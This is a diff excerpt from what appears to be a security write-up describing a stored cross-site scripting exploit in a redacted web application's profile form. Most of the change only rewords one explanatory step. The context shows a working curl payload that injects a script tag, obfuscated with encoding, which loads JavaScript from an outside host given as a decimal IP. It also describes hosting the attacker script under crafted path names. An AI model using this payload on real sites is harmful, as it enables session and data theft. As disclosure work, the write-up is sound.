@@ -17,7 +17,7 @@ The steps to exploitation were:
      ```bash
      curl -i -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b '.AspNet.Cookies=:userSessionCookie' --data-binary 'FirstName=Colin&LastName=%EF%BC%9Cscript+src%3Dhttp%3A%2F%2F2852039166%2F' https://redacted.com/profile/
      ```
-  1. On the remote web server, create a directory called `)<` and a file underneath it called `span`. The reason the directory and file must be called this is due to the HTML in the last name breaking the HTML on the page and I can’t add any more characters in my profile last name to close the HTML tag because of the character limit.
+  1. On the remote web server, create a directory called `)<` and a file underneath it called `span`. The directory and file must use this name because the HTML in the last name is breaking the page. Due to the character limit, I can't add enough characters to my profile last name to properly close the HTML tag.
   1. Write the following JavaScript file contents to the span file on the remote server.
      ```javascript
      // The internal API domain name was found in one of the responses that is triggered when logging into the application on the login domain
